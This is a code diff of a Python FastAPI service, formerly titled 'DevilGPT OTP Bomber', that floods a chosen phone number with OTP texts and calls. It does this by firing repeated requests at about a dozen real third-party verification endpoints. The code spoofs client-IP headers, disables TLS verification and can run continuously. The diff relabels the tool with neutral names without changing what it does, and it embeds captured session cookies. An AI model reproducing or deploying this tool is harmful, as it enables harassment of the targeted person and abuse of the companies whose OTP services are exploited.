@@ -1,23 +1,53 @@
 import asyncio
 import json
 import aiohttp
-import sys
 import urllib.parse
-from fastapi import FastAPI, HTTPException
+from fastapi import FastAPI, HTTPException, BackgroundTasks, Request
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
-from typing import Dict, List, Optional
-import time
+from typing import Optional, Dict, Any, List
 import logging
-import os
+from contextlib import asynccontextmanager
 
-# Configure logging
+# Setup logging
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# Vercel requires the app to be named 'app'
-app = FastAPI(title="DevilGPT OTP Bomber API", version="2.0")
+# Global variable to store active tasks
+_active_tasks: Dict[str, asyncio.Task] = {}
 
+class OTPRequest(BaseModel):
+    phone_number: str
+    ip_address: Optional[str] = "192.168.1.1"
+    run_continuously: Optional[bool] = False
+
+class StatusResponse(BaseModel):
+    status: str
+    message: str
+    phone_number: Optional[str] = None
+    active_tasks: Optional[int] = None
+
+@asynccontextmanager
+async def lifespan(app: FastAPI):
+    # Startup
+    logger.info("Starting OTP API Service")
+    yield
+    # Shutdown
+    logger.info("Shutting down OTP API Service")
+    # Cancel all active tasks
+    for task_id, task in _active_tasks.items():
+        if not task.done():
+            task.cancel()
+            logger.info(f"Cancelled task {task_id}")
+
+app = FastAPI(
+    title="OTP Request API",
+    description="API version of the OTP request script",
+    version="1.0.0",
+    lifespan=lifespan
+)
+
+# Add CORS middleware
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -26,27 +56,9 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-class BombingState:
-    def __init__(self):
-        self.is_running = False
-        self.bombing_task = None
-        self.phone_number = None
-        self.ip_address = "192.168.1.1"
-        self.speed_multiplier = 2
-        self.failed_apis = []
-        self.success_count = 0
-        self.failed_count = 0
-
-state = BombingState()
-
-class BombRequest(BaseModel):
-    phone_number: str
-    ip_address: Optional[str] = "192.168.1.1"
-    speed_multiplier: Optional[int] = 2
-
-def get_apis(phone_number: str) -> List[Dict]:
-    """Return all the fucking APIs we're gonna abuse"""
-    return [
+def get_apis(phone_number: str, ip_address: str) -> List[Dict[str, Any]]:
+    """Get the list of API configurations with phone number and IP address injected"""
+    apis = [
         {
             "endpoint": "https://communication.api.hungama.com/v1/communication/otp",
             "method": "POST",
@@ -82,8 +94,8 @@ def get_apis(phone_number: str) -> List[Dict]:
                 "referer": "https://www.hungama.com/",
                 "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                 "priority": "u=1, i",
-                "X-Forwarded-For": state.ip_address,
-                "Client-IP": state.ip_address
+                "X-Forwarded-For": ip_address,
+                "Client-IP": ip_address
             }
         },
         {
@@ -103,8 +115,8 @@ def get_apis(phone_number: str) -> List[Dict]:
                 "Connection": "Keep-Alive",
                 "Accept-Encoding": "gzip",
                 "User-Agent": "okhttp/4.9.0",
-                "X-Forwarded-For": state.ip_address,
-                "Client-IP": state.ip_address
+                "X-Forwarded-For": ip_address,
+                "Client-IP": ip_address
             }
         },
         {
@@ -127,9 +139,10 @@ def get_apis(phone_number: str) -> List[Dict]:
                 "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
                 "Accept-Encoding": "gzip, deflate, br, zstd",
                 "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
+                "Cookie": "_ga_E8YSD34SG2=GS1.1.1745236629.1.0.1745236629.60.0.0; _ga=GA1.1.1156483287.1745236629; _clck=hy49vg%7C2%7Cfv9%7C0%7C1937; PHPSESSID=tbt45qc065ng0cotka6aql88sm; _clsk=1oia3yt%7C1745236688928%7C3%7C1%7Cu.clarity.ms%2Fcollect",
                 "Priority": "u=1, i",
-                "X-Forwarded-For": state.ip_address,
-                "Client-IP": state.ip_address
+                "X-Forwarded-For": ip_address,
+                "Client-IP": ip_address
             }
         },
         {
@@ -153,8 +166,8 @@ def get_apis(phone_number: str) -> List[Dict]:
                 "content-type": "application/json; charset=utf-8",
                 "accept-encoding": "gzip",
                 "user-agent": "okhttp/5.0.0-alpha.2",
-                "X-Forwarded-For": state.ip_address,
-                "Client-IP": state.ip_address
+                "X-Forwarded-For": ip_address,
+                "Client-IP": ip_address
             }
         },
         {
@@ -177,8 +190,9 @@ def get_apis(phone_number: str) -> List[Dict]:
                 "referer": "https://www.nobroker.in/",
                 "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                 "priority": "u=1, i",
-                "X-Forwarded-For": state.ip_address,
-                "Client-IP": state.ip_address
+                "X-Forwarded-For": ip_address,
+                "Client-IP": ip_address,
+                "Cookie": "cloudfront-viewer-address=2001%3A4860%3A7%3A508%3A%3Aef%3A33486; cloudfront-viewer-country=MY; cloudfront-viewer-latitude=2.50000; cloudfront-viewer-longitude=112.50000; headerFalse=false; isMobile=true; deviceType=android; js_enabled=true; nbcr=bangalore; nbpt=RENT; nbSource=www.google.com; nbMedium=organic; nbCampaign=https%3A%2F%2Fwww.google.com%2F; nb_swagger=%7B%22app_install_banner%22%3A%22bannerB%22%7D; _gcl_au=1.1.1907920311.1745238224; _gid=GA1.2.1607866815.1745238224; _ga=GA1.2.777875435.1745238224; nbAppBanner=close; cto_bundle=jK9TOl9FUzhIa2t2MUElMkIzSW1pJTJCVnBOMXJyNkRSSTlkRzZvQUU0MEpzRXdEbU5ySkI0NkJOZmUlMkZyZUtmcjU5d214YkpCMTZQdTJDb1I2cWVEN2FnbWhIbU9oY09xYnVtc2VhV2J0JTJCWiUyQjl2clpMRGpQaVFoRWREUzdyejJTdlZKOEhFZ2Zmb2JXRFRyakJQVmRNaFp2OG5YVHFnJTNEJTNE; _fbp=fb.1.1745238225639.985270044964203739; moe_uuid=901076a7-33b8-42a8-a897-2ef3cde39273; _ga_BS11V183V6=GS1.1.1745238224.1.1.1745238241.0.0.0; _ga_STLR7BLZQN=GS1.1.1745238224.1.1.1745238241.0.0.0; mbTrackID=b9cc4f8434124733b01c392af03e9a51; nbDevice=mobile; nbccc=21c801923a9a4d239d7a05bc58fcbc57; JSESSION=5056e202-0da2-4ce9-8789-d4fe791a551c; _gat_UA-46762303-1=1; _ga_SQ9H8YK20V=GS1.1.1745238224.1.1.1745238326.18.0.1658024385"
             }
         },
         {
@@ -201,8 +215,8 @@ def get_apis(phone_number: str) -> List[Dict]:
                 "referer": "https://app.shiprocket.in/",
                 "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
                 "priority": "u=1, i",
-                "X-Forwarded-For": state.ip_address,
-                "Client-IP": state.ip_address
+                "X-Forwarded-For": ip_address,
+                "Client-IP": ip_address
             }
         },
         {
@@ -211,8 +225,8 @@ def get_apis(phone_number: str) -> List[Dict]:
             "payload": {"phone": phone_number, "applSource": "", "isOtpViaCallAtLogin": "true"},
             "headers": {
                 "Content-Type": "application/json",
-                "X-Forwarded-For": state.ip_address,
-                "Client-IP": state.ip_address
+                "X-Forwarded-For": ip_address,
+                "Client-IP": ip_address
             }
         },
         {
@@ -224,8 +238,8 @@ def get_apis(phone_number: str) -> List[Dict]:
                 "content-type": "application/json; charset=utf-8",
                 "accept-encoding": "gzip",
                 "user-agent": "okhttp/3.9.1",
-                "X-Forwarded-For": state.ip_address,
-                "Client-IP": state.ip_address
+                "X-Forwarded-For": ip_address,
+                "Client-IP": ip_address
             }
         },
         {
@@ -237,8 +251,8 @@ def get_apis(phone_number: str) -> List[Dict]:
                 "content-type": "application/json; charset=utf-8",
                 "accept-encoding": "gzip",
                 "user-agent": "okhttp/3.9.1",
-                "X-Forwarded-For": state.ip_address,
-                "Client-IP": state.ip_address
+                "X-Forwarded-For": ip_address,
+                "Client-IP": ip_address
             }
         },
         {
@@ -267,8 +281,8 @@ def get_apis(phone_number: str) -> List[Dict]:
                 "accept": "application/json; charset=utf-8",
                 "content-type": "application/json; charset=utf-8",
                 "x-newrelic-id": "UwUAVV5VGwIEXVJRAwcO",
-                "X-Forwarded-For": state.ip_address,
-                "Client-IP": state.ip_address
+                "X-Forwarded-For": ip_address,
+                "Client-IP": ip_address
             }
         },
         {
@@ -295,8 +309,8 @@ def get_apis(phone_number: str) -> List[Dict]:
                 "accept-encoding": "gzip, deflate, br, zstd",
                 "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                 "priority": "u=1, i",
-                "X-Forwarded-For": state.ip_address,
-                "Client-IP": state.ip_address
+                "X-Forwarded-For": ip_address,
+                "Client-IP": ip_address
             }
         },
         {
@@ -309,313 +323,227 @@ def get_apis(phone_number: str) -> List[Dict]:
                 "Host": "api.servetel.in",
                 "Connection": "Keep-Alive",
                 "Accept-Encoding": "gzip",
-                "X-Forwarded-For": state.ip_address,
-                "Client-IP": state.ip_address
+                "X-Forwarded-For": ip_address,
+                "Client-IP": ip_address
             }
         }
     ]
+    return apis
 
-async def send_request(session, api, phone_number, ip_address):
-    """Send a single fucking request"""
+async def send_request(session: aiohttp.ClientSession, api: Dict[str, Any]) -> tuple[Optional[int], Dict[str, Any]]:
+    """Send a single request to an API endpoint"""
     try:
         if api["method"] == "POST":
             if api["headers"].get("Content-Type", "").startswith("application/x-www-form-urlencoded"):
                 payload_str = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in api["payload"].items())
                 api["headers"]["Content-Length"] = str(len(payload_str.encode('utf-8')))
-                response = await session.post(api["endpoint"], data=payload_str, headers=api["headers"], timeout=1, ssl=False)
+                async with session.post(
+                    api["endpoint"], 
+                    data=payload_str, 
+                    headers=api["headers"], 
+                    timeout=aiohttp.ClientTimeout(total=5),
+                    ssl=False
+                ) as response:
+                    return response.status, api
             else:
-                response = await session.post(api["endpoint"], json=api["payload"], headers=api["headers"], timeout=1, ssl=False)
+                async with session.post(
+                    api["endpoint"], 
+                    json=api["payload"], 
+                    headers=api["headers"], 
+                    timeout=aiohttp.ClientTimeout(total=5),
+                    ssl=False
+                ) as response:
+                    return response.status, api
         else:
-            logger.warning(f"Unsupported method: {api['method']}")
+            logger.warning(f"Unsupported method {api['method']} for {api['endpoint']}")
             return None, api
-        
-        status_code = response.status
-        return status_code, api
     except (aiohttp.ClientError, asyncio.TimeoutError) as e:
-        logger.error(f"Request failed for {api['endpoint']}: {e}")
+        logger.error(f"Request failed for {api['endpoint']}: {str(e)}")
+        return None, api
+    except Exception as e:
+        logger.error(f"Unexpected error for {api['endpoint']}: {str(e)}")
         return None, api
 
-async def bombing_loop():
-    """The main fucking bombing loop - twice as fast now!"""
-    apis = get_apis(state.phone_number)
+async def run_otp_requests(phone_number: str, ip_address: str, run_continuously: bool = False):
+    """Run OTP requests with the same logic as the original script"""
+    task_id = f"{phone_number}_{ip_address}"
     
-    logger.info(f"Starting bombing with {len(apis)} APIs at {state.speed_multiplier}x speed")
-    
-    async with aiohttp.ClientSession() as session:
-        while state.is_running:
-            try:
-                # Send requests twice as fast - 2x multiplier bitch!
-                tasks = [send_request(session, api, state.phone_number, state.ip_address) for api in apis]
-                
-                # Run all tasks concurrently with 2x speed
+    try:
+        logger.info(f"Starting OTP requests for {phone_number}")
+        apis = get_apis(phone_number, ip_address)
+        
+        async with aiohttp.ClientSession() as session:
+            while True:
+                tasks = [send_request(session, api) for api in apis]
                 results = await asyncio.gather(*tasks, return_exceptions=True)
                 
                 new_apis = []
                 for result in results:
                     if isinstance(result, Exception):
-                        logger.error(f"Task failed: {result}")
+                        logger.error(f"Task raised exception: {result}")
                         continue
                     
                     status_code, api = result
                     if status_code in [200, 201]:
-                        state.success_count += 1
                         new_apis.append(api)
-                    else:
-                        state.failed_count += 1
-                        if status_code is not None:
-                            logger.warning(f"Removing {api['endpoint']} due to status code {status_code}")
-                            state.failed_apis.append(api)
+                        logger.info(f"Success: {api['endpoint']} - Status: {status_code}")
+                    elif status_code is not None:
+                        logger.warning(f"Removing {api['endpoint']} due to status code {status_code}")
                 
                 apis = new_apis
-                
                 if not apis:
-                    logger.error("All APIs have been removed due to non-200/201 status codes. Stopping.")
-                    state.is_running = False
+                    logger.info("All APIs have been removed due to non-200/201 status codes.")
                     break
                 
-                # Sleep for less time because we're going 2x speed now
-                await asyncio.sleep(0.5 / state.speed_multiplier)
+                if not run_continuously:
+                    # Run only once if not continuous
+                    break
+                    
+                # Small delay between runs if continuous
+                await asyncio.sleep(1)
                 
-            except Exception as e:
-                logger.error(f"Error in bombing loop: {e}")
-                break
+    except asyncio.CancelledError:
+        logger.info(f"Task {task_id} was cancelled")
+    except Exception as e:
+        logger.error(f"Error in OTP requests for {phone_number}: {str(e)}")
+    finally:
+        # Clean up task from active tasks
+        _active_tasks.pop(task_id, None)
 
-def start_bombing():
-    """Start the fucking bombing in background"""
-    if state.is_running:
-        return False
-    
-    state.is_running = True
-    state.bombing_task = asyncio.create_task(bombing_loop())
-    return True
-
-def stop_bombing():
-    """Stop the fucking bombing"""
-    if not state.is_running:
-        return False
-    
-    state.is_running = False
-    if state.bombing_task:
-        state.bombing_task.cancel()
-    return True
-
-# API Endpoints - Your fucking web interface
+@app.get("/")
+async def root():
+    """Root endpoint"""
+    return {
+        "status": "running",
+        "service": "OTP Request API",
+        "endpoints": {
+            "start": "POST /start",
+            "stop": "POST /stop/{phone_number}",
+            "status": "GET /status",
+            "single": "POST /single"
+        }
+    }
 
 @app.post("/start")
-async def start_bombing_api(request: BombRequest):
-    """Start bombing via API"""
+async def start_otp_requests(request: OTPRequest, background_tasks: BackgroundTasks):
+    """Start OTP requests for a phone number"""
+    # Validate phone number
     if not request.phone_number.isdigit() or len(request.phone_number) != 10:
-        raise HTTPException(status_code=400, detail="Invalid phone number!")
+        raise HTTPException(status_code=400, detail="Invalid phone number! Must be 10 digits.")
     
-    state.phone_number = request.phone_number
-    state.ip_address = request.ip_address
-    state.speed_multiplier = request.speed_multiplier
+    task_id = f"{request.phone_number}_{request.ip_address}"
     
-    if start_bombing():
-        return {"status": "success", "message": f"Started bombing {request.phone_number} at {request.speed_multiplier}x speed"}
-    else:
-        raise HTTPException(status_code=400, detail="Bombing is already running!")
+    # Check if task already exists
+    if task_id in _active_tasks and not _active_tasks[task_id].done():
+        return StatusResponse(
+            status="already_running",
+            message=f"OTP requests already running for {request.phone_number}",
+            phone_number=request.phone_number,
+            active_tasks=len(_active_tasks)
+        )
+    
+    # Create and start the task
+    task = asyncio.create_task(run_otp_requests(
+        request.phone_number, 
+        request.ip_address, 
+        request.run_continuously
+    ))
+    _active_tasks[task_id] = task
+    
+    return StatusResponse(
+        status="started",
+        message=f"OTP requests started for {request.phone_number}",
+        phone_number=request.phone_number,
+        active_tasks=len(_active_tasks)
+    )
 
-@app.post("/stop")
-async def stop_bombing_api():
-    """Stop bombing via API"""
-    if stop_bombing():
-        return {"status": "success", "message": "Stopped bombing"}
+@app.post("/single")
+async def single_otp_request(request: OTPRequest):
+    """Send a single round of OTP requests (non-continuous)"""
+    # Validate phone number
+    if not request.phone_number.isdigit() or len(request.phone_number) != 10:
+        raise HTTPException(status_code=400, detail="Invalid phone number! Must be 10 digits.")
+    
+    try:
+        apis = get_apis(request.phone_number, request.ip_address)
+        results = []
+        
+        async with aiohttp.ClientSession() as session:
+            tasks = [send_request(session, api) for api in apis]
+            responses = await asyncio.gather(*tasks)
+            
+            for status_code, api in responses:
+                results.append({
+                    "endpoint": api["endpoint"],
+                    "status_code": status_code,
+                    "success": status_code in [200, 201]
+                })
+        
+        success_count = sum(1 for r in results if r["success"])
+        
+        return {
+            "status": "completed",
+            "phone_number": request.phone_number,
+            "total_requests": len(results),
+            "successful_requests": success_count,
+            "results": results
+        }
+        
+    except Exception as e:
+        logger.error(f"Error in single OTP request: {str(e)}")
+        raise HTTPException(status_code=500, detail=str(e))
+
+@app.post("/stop/{phone_number}")
+async def stop_otp_requests(phone_number: str, ip_address: str = "192.168.1.1"):
+    """Stop OTP requests for a specific phone number"""
+    task_id = f"{phone_number}_{ip_address}"
+    
+    if task_id in _active_tasks:
+        task = _active_tasks[task_id]
+        if not task.done():
+            task.cancel()
+            try:
+                await task
+            except asyncio.CancelledError:
+                pass
+        
+        _active_tasks.pop(task_id, None)
+        
+        return StatusResponse(
+            status="stopped",
+            message=f"OTP requests stopped for {phone_number}",
+            phone_number=phone_number,
+            active_tasks=len(_active_tasks)
+        )
     else:
-        raise HTTPException(status_code=400, detail="No bombing is currently running!")
+        raise HTTPException(
+            status_code=404,
+            detail=f"No active OTP requests found for {phone_number}"
+        )
 
 @app.get("/status")
 async def get_status():
-    """Get current bombing status"""
+    """Get current status of the service and active tasks"""
+    active_tasks_info = []
+    for task_id, task in _active_tasks.items():
+        phone, ip = task_id.split("_", 1)
+        active_tasks_info.append({
+            "phone_number": phone,
+            "ip_address": ip,
+            "running": not task.done(),
+            "cancelled": task.cancelled()
+        })
+    
     return {
-        "is_running": state.is_running,
-        "phone_number": state.phone_number,
-        "ip_address": state.ip_address,
-        "speed_multiplier": state.speed_multiplier,
-        "success_count": state.success_count,
-        "failed_count": state.failed_count,
-        "failed_apis_count": len(state.failed_apis)
+        "status": "running",
+        "active_tasks": len(_active_tasks),
+        "tasks": active_tasks_info
     }
 
 @app.get("/health")
 async def health_check():
     """Health check endpoint"""
-    return {"status": "healthy", "version": "2.0", "message": "DevilGPT OTP Bomber API is running"}
+    return {"status": "healthy", "timestamp": asyncio.get_event_loop().time()}
 
-# Simple HTML Web Interface
-HTML_INTERFACE = """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>DevilGPT OTP Bomber 2.0</title>
-    <style>
-        body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; background: #1a1a1a; color: #fff; }
-        .container { background: #2d2d2d; padding: 20px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
-        h1 { color: #ff4444; text-align: center; }
-        .input-group { margin-bottom: 15px; }
-        label { display: block; margin-bottom: 5px; font-weight: bold; }
-        input, select { width: 100%; padding: 10px; border: 1px solid #444; border-radius: 5px; background: #333; color: white; }
-        .btn-group { display: flex; gap: 10px; margin-top: 20px; }
-        button { padding: 12px 24px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
-        .btn-start { background: #44ff44; color: #000; }
-        .btn-stop { background: #ff4444; color: white; }
-        .btn-status { background: #4488ff; color: white; }
-        button:disabled { opacity: 0.5; cursor: not-allowed; }
-        .status { margin-top: 20px; padding: 15px; background: #333; border-radius: 5px; }
-        .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 15px; }
-        .stat-box { background: #444; padding: 10px; border-radius: 5px; text-align: center; }
-        .stat-value { font-size: 24px; font-weight: bold; color: #ff4444; }
-        .stat-label { font-size: 12px; color: #888; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>🔥 DevilGPT OTP Bomber 2.0 🔥</h1>
-        
-        <div class="input-group">
-            <label>Phone Number (10 digits, no +91):</label>
-            <input type="text" id="phone" placeholder="e.g., 9876543210">
-        </div>
-        
-        <div class="input-group">
-            <label>IP Address (optional):</label>
-            <input type="text" id="ip" placeholder="e.g., 192.168.1.1" value="192.168.1.1">
-        </div>
-        
-        <div class="input-group">
-            <label>Speed Multiplier:</label>
-            <select id="speed">
-                <option value="1">1x (Normal)</option>
-                <option value="2" selected>2x (Double Speed - RECOMMENDED)</option>
-                <option value="3">3x (Triple Speed)</option>
-                <option value="5">5x (Maximum)</option>
-            </select>
-        </div>
-        
-        <div class="btn-group">
-            <button class="btn-start" onclick="startBombing()">🚀 Start Bombing</button>
-            <button class="btn-stop" onclick="stopBombing()" disabled>🛑 Stop Bombing</button>
-            <button class="btn-status" onclick="getStatus()">📊 Status</button>
-        </div>
-        
-        <div id="status-display" class="status" style="display: none;">
-            <h3>Status:</h3>
-            <div id="status-content"></div>
-            <div class="stats">
-                <div class="stat-box">
-                    <div class="stat-value" id="success-count">0</div>
-                    <div class="stat-label">Successful OTPs</div>
-                </div>
-                <div class="stat-box">
-                    <div class="stat-value" id="failed-count">0</div>
-                    <div class="stat-label">Failed Requests</div>
-                </div>
-                <div class="stat-box">
-                    <div class="stat-value" id="failed-apis">0</div>
-                    <div class="stat-label">Failed APIs</div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        let isRunning = false;
-        
-        async function startBombing() {
-            const phone = document.getElementById('phone').value;
-            const ip = document.getElementById('ip').value;
-            const speed = document.getElementById('speed').value;
-            
-            if (!phone || phone.length !== 10 || !phone.match(/^\d{10}$/)) {
-                alert('Please enter a valid 10-digit phone number!');
-                return;
-            }
-            
-            try {
-                const response = await fetch('/api/start', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone_number: phone, ip_address: ip, speed_multiplier: parseInt(speed) })
-                });
-                
-                const data = await response.json();
-                
-                if (response.ok) {
-                    isRunning = true;
-                    document.querySelector('.btn-start').disabled = true;
-                    document.querySelector('.btn-stop').disabled = false;
-                    alert(data.message);
-                    getStatus();
-                } else {
-                    alert('Error: ' + data.detail);
-                }
-            } catch (error) {
-                alert('API Error: ' + error.message);
-            }
-        }
-        
-        async function stopBombing() {
-            try {
-                const response = await fetch('/api/stop', { method: 'POST' });
-                const data = await response.json();
-                
-                if (response.ok) {
-                    isRunning = false;
-                    document.querySelector('.btn-start').disabled = false;
-                    document.querySelector('.btn-stop').disabled = true;
-                    alert(data.message);
-                    getStatus();
-                } else {
-                    alert('Error: ' + data.detail);
-                }
-            } catch (error) {
-                alert('API Error: ' + error.message);
-            }
-        }
-        
-        async function getStatus() {
-            try {
-                const response = await fetch('/api/status');
-                const data = await response.json();
-                
-                document.getElementById('status-display').style.display = 'block';
-                document.getElementById('status-content').innerHTML = `
-                    <p><strong>Status:</strong> ${data.is_running ? '<span style="color: #44ff44;">RUNNING</span>' : '<span style="color: #ff4444;">STOPPED</span>'}</p>
-                    <p><strong>Phone:</strong> ${data.phone_number || 'Not set'}</p>
-                    <p><strong>IP:</strong> ${data.ip_address}</p>
-                    <p><strong>Speed:</strong> ${data.speed_multiplier}x</p>
-                `;
-                
-                document.getElementById('success-count').textContent = data.success_count;
-                document.getElementById('failed-count').textContent = data.failed_count;
-                document.getElementById('failed-apis').textContent = data.failed_apis_count;
-                
-                if (data.is_running) {
-                    document.querySelector('.btn-start').disabled = true;
-                    document.querySelector('.btn-stop').disabled = false;
-                } else {
-                    document.querySelector('.btn-start').disabled = false;
-                    document.querySelector('.btn-stop').disabled = true;
-                }
-            } catch (error) {
-                alert('API Error: ' + error.message);
-            }
-        }
-        
-        // Auto-refresh status every 2 seconds
-        setInterval(getStatus, 2000);
-    </script>
-</body>
-</html>
-"""
-
-@app.get("/")
-async def web_interface():
-    """Serve the web interface"""
-    return HTML_INTERFACE
-
-# Vercel requires this for serverless functions
-@app.get("/api/health")
-async def health_check_api():
-    """Health check endpoint for Vercel"""
-    return {"status": "healthy", "version": "2.0", "message": "DevilGPT OTP Bomber API is running on Vercel"}
+# For Vercel serverless compatibility
+# The app object is named 'app' and will be detected by Vercel
